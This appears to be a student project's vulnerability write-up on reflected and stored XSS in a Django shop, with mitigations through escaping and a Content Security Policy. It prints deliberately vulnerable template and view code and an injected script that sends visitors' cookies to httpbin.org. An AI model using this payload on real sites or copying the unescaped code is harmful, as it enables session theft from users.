# CWE-79: Cross-Site Scripting (XSS), CWE-352: Cross-Site Request Forgery (CSRF)

**Severity**: 5.7

**CVSS Vector String**: AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N

### Description

The website is suscetible to both **Refleted XSS** and **Stored XSS**.

In the website there is a search box whose purpose is to search products by name. Whenever this form is filled the input appears on the url and is displayed what the user searched for. Because of this we can share the url including the search parameter to other people. By inserting some javascript code in the form and by sharing the resulting link we can execute this javascript code when the page loads in other user's browsers if they somehow are drawned to click the previously crafted link.

The review product feature on the online shop is susceptible to the injection of malicius code using Cross-Site Scripting (XSS) and, subsequently to Cross-Site Request Forgery (CSRF) attacks.

In this field the website is vulnerable to **Stored XSS**. Whenever someone submits a review, it gets saved in the underlying SQLite database without sanitizing it. If a saved review has malicious code, whenever that review is loaded in from the database without any precaution into the template and the HTML page gets rendered, it will get executed.

By default Django automatically escapes potencial harmfull characters that may be contained in a variable and end up affecting the resulting HTML. However by using the safe tag in a template variable the website is exposed to any user input that may affect the normal behaviour of the website (a person might want to do that if he/she wants to store a BLOB of html in the database and embed that directly to html for example). In this case we're just trusting the user input blindly and loading the text of the review from the database. This is something that should never be done and will lead to the previously discussed scenario.

**Reflected XSS:**
- Submission Form - no validation other that checking if form field is empty;
```html
<!-- search form -->
<form class="col-12 col-lg-auto mb-3 mb-lg-0 me-lg-3" action="{% url 'shop:search' %}" onsubmit="return !isEmptySearch()">
  <input name="q" type="search" class="form-control form-control-dark" placeholder="Search..." aria-label="Search" id="search1">
</form>
```
- View - acceses the parameter in the url and incorporates it blindly (SQL Injection discussed in the file [CWE-89.md](CWE-89.md));
```python
def search(request):
	try:
		query = request.GET.get('q')
		products = Product.objects.raw("SELECT * FROM shop_product WHERE shop_product.title LIKE '%%%s%%'" % query)
		context = {'products': products, 'search': query}
		return render(request, 'home_page.html', context)
	except Exception as e:
		print("Exception caught on @search:", e)
		# hide errors from users
		products = Product.objects.filter(quantity__gte=1)
		context = get_ordered_products_context(request, products)
		return render(request, 'home_page.html', context)
```
- Displaying Search Message - using the safe parameter and thereby not escaping the html content;
```html
{% if search %}
    <div class="row">
      <div class="col-md-2"></div>
      <div class="col-md-8 mt-2 text-center">
        <br>
        <h3 class="text-muted text-capitalize">These Products were found for {{ search|safe }}!</h3>
      </div>
      <div class="col-md-2"></div>
    </div>
{% endif %}
...
{% if search %}
    <div class="row">
      <div class="col-md-2"></div>
      <div class="col-md-8 mt-5 pt-5 text-center">
        <br>
        <h3 class="text-muted text-capitalize">No Products were found for {{ search|safe }}!</h3>
      </div>
      <div class="col-md-2"></div>
    </div>
{% endif %}
```

**Stored XSS:**
- Definition Form - no validation other that checking if form field is empty;
```python
class ReviewForm(forms.Form):
  review = forms.CharField(label='',widget=forms.Textarea(
      attrs={'class': 'form-control', 'id': 'reviewProduct', 'rows': '4',
              'placeholder': "Your opinion on the product"}
  ))
  rating = forms.IntegerField(widget=forms.HiddenInput(
      attrs={'id': 'hiddenRating'},
  ))
  user_review_image = forms.FileField(label='', required=False, widget=forms.FileInput(attrs={
      'class': 'form-control', 'style': 'width: 20%', 'id': 'imageReviewInput'
  }))

  def clean(self):
      cleaned_data = super().clean() # invoke parent_class
      comment = cleaned_data.get('review')
      rating = cleaned_data.get('rating')
      user_review_image = cleaned_data.get('user_review_image')
      if comment is None:
          raise forms.ValidationError("A comment about the product is required. Please tell us your opinion")
      if rating is None or rating == 0:
          raise forms.ValidationError("Rating is required. Please select a rating.")

      return cleaned_data
```
- Submission Form - follows the validation of the defined python form;
```html
<h3>User Reviews</h3>
<hr/>
<form method="post" action="" class="mb-1" enctype="multipart/form-data">
    {% csrf_token %}
    <div class="d-flex flex-row">
        <h5 class="p-2"><label for="reviewProduct" class="form-label">Review Your Purchase</label></h5>
        <span class="p-2 align-items-center">
            {% for i in "01234"|make_list %}
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-star" viewBox="0 0 16 16" id="star{{ i }}" onclick="toggleStar(this,{{ i }})">
                  <path d="..."/>
                </svg>
            {% endfor %}
        </span>
    </div>
    {% if ReviewFormErrors %}
    <div class="alert alert-danger" role="alert">
        {% for error in ReviewFormErrors %}
            <div>{{ error }}</div>
        {% endfor %}
    </div>
    {% endif %}
    <!-- Form Fields -->
    {{ ReviewForm.review }}
    {{ ReviewForm.rating }}
    <div class="d-flex justify-content-between mt-2 mb-2">
        {{ ReviewForm.user_review_image }}
        <input type="submit" class="btn btn-primary" value="Add Review">
    </div>
</form>

```
- View - follows the form validation, does no additional validation and stores the text of the review blindly; 
```python
@login_required
def product_detail(request, slug):
	product = get_object_or_404(Product, slug=slug)
	related_products = Product.objects.filter(category=product.category).all()[:5]
	context = {
		'title': product.title,
		'product': product,
		'QuantityForm': QuantityForm(),
		'favorites': 'favorites',
		'related_products': related_products,
		'reviews': product.review_set.all(),
	}

	if request.method == 'POST':
		review_form = ReviewForm(request.POST, request.FILES)
		if review_form.is_valid():
			rating = review_form.cleaned_data["rating"]
			review = review_form.cleaned_data["review"]
			user_review_image = request.FILES.get("user_review_image")
			try:
				r = Review(rating=rating, review=review, product=product, user_review_image=user_review_image, user=request.user)
				r.save()
			except IntegrityError as e:
				# If user has already done a review
				context["ReviewFormErrors"] = ["You have already reviewed this product. You can't do it again!"]
			context["ReviewForm"] = ReviewForm()
		else:
			context["ReviewForm"] = ReviewForm(initial={'review': review_form.cleaned_data["review"]})
			errors = review_form.errors.get("__all__")
			context["ReviewFormErrors"] = errors if errors else []
	else:
		context["ReviewForm"] = ReviewForm()

	if request.user.likes.filter(id=product.id).first():
		context['favorites'] = 'remove'
	return render(request, 'product_detail.html', context)
```
- Displaying Review Text - using the safe parameter and thereby not escaping the html content;
```html
{% for review in reviews %}
<div class="card mt-1" style="width: inherit">
    <div class="card-body">
        <div class="row">
            ...
            <div class="col">
                <h4 style="font-weight: bolder;">{{ review.user.full_name }}</h4>
                <p style="font-weight: 300;">{{ review.review|safe }}</p>
            </div>
            ...
        </div>
    </div>
</div>
{% endfor %}
```

Since this code can execute in the context of other users' browsers, it could potentially lead to the theft of sensitive information, session hijacking, DDoS attacks, credential harvesting, among others.

### Exploitation

To exploit this vulnerability, an attacker would create a new review, including malicious JS code into the text field, as such:

```html
<script>
  alert("Hello from the review")
</script>
```

This code gets ran everytime someone loads the page containing the review in their browser, showing an alert box with the text "Hello from the review".


### Mitigations

To prevent this kind of situations all that we have to do is not use the safe tag (or if we use we guarantee the sanitization of user input first).

We can also implement a CSP (Content-Security-Policy) as a prevention agains XSS attacks. CSP allows us to specify which resources of content are allowed within our website. Here is how we defined our Content Security Policy:
```python
# Content Security Policy
CSP_DEFAULT_SRC = ("'none'", )
CSP_SCRIPT_SRC = ("'self'", 'cdn.jsdelivr.net', 'code.jquery.com', "'unsafe-inline'")
CSP_CONNECT_SRC = ("'self'", )
CSP_IMG_SRC = ("'self'", )
CSP_STYLE_SRC = ("'self'", 'cdn.jsdelivr.net', 'https://fonts.googleapis.com', "'unsafe-inline'", )
CSP_FONT_SRC = ("'self'", 'https://fonts.gstatic.com', )
```
The previous code does the following:
 - **CSP_DEFAULT_SRC** - sets the default source for various content types to none. Consequently, no content is allowed unless explicitly specified otherwise;
 -  **CSP_SCRIPT_SRC** - specifies the sources from where scripts can be loaded and executed. With emphasis on the "'self'" origin and the use of "'unsafe-inline'". The latter allows the execution of inline scripts like "\<script>alert("hello")\</script>" and because of that allowing the existance of XSS. We didn't remove this line ("'unsafe-inline'") because we had some trouble adding the event listeners and because of that we would lose some functionalities of the website. However, if we could solve this problem we would remove the inline approach and only use external scripts (.js files from static folder) with event listeners;
 - **CSP_CONNECT_SRC** - specifies the source from which network connection can be made. (useful to prevent post methods to a external server embeded in injected code as we will later see);
 - **CSP_IMG_SRC** - specifies the sources from which images may be loaded;
 - **CSP_STYLE_SRC** - specifies the sources from which styles (CSS for instance) may be loaded;
 - **CSP_FONT_SRC** -  specifies the sources from which fonts may be loaded.



### Demonstrations


This section will have video footage of *exploiting the vulnerabilities* and *trying to exploit them after they've been fixed*:


#### Exploiting Vulnerability

- Reflected XSS through the *Search box*:

https://github.com/detiuaveiro/1st-project-group_04/assets/97046574/f576f46d-93bd-4a81-9cec-f2896b270476

- An attacker creates a review that includes malicious code. That malicious code will be stored in the database and loaded whenever the page is loaded by anyone.

https://github.com/detiuaveiro/1st-project-group_04/assets/97046574/368a68a6-ed4d-4102-b494-54004f09e8a2

- An attacker creates a review that includes the following malicious code to perform a *CSRF attack*:

```html
<script>
const xhr = new XMLHttpRequest();
xhr.open("POST", "https://httpbin.org/post");
xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
const body = JSON.stringify({"cookie" : Document.cookie});
xhr.onload = () => {
  if (xhr.readyState == 4 && xhr.status == 200) {
    console.log(JSON.parse(xhr.responseText));
  } else {
    console.log(`Error: ${xhr.status}`);
  }
};
xhr.send(body);
</script>
```

This code will send an HTTP POST request to a website (*httpbin* used to test these http requests) including cookies for the current page in the body of the request.

Since it's loaded every time the page is loaded, every user who opens this product, will have their cookies sent over by the POST request.

#### Trying to exploit after fix is implemented

- An attacker tries to post a review with malicious javascript code, but fails because the input is automatically escaped when building the HTML template.

https://github.com/detiuaveiro/1st-project-group_04/assets/97046574/c33836fc-85cc-438a-8e25-10052a164bda

- An attacker tries to post a review with a CSRF attack, but the *Content Security Policy* headers don't allow this behaviour.

**NOTE**: For this test, we enabled `|safe` in the HTML file related to reviews, which purposely allows XSS, purely for demonstration of CSP.
